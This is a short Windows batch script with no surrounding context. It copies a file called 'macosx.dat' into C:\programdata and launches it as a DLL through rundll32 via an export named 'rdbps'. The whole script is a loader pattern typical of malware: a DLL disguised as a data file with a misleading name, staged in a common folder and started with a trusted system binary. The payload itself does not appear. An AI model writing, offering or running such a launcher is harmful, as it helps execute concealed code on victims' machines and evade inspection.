@echo off
xcopy /H /y macosx.dat c:\programdata\
C:\Windows\System32\rundll32.exe C:\programdata\macosx.dat,rdbps
exit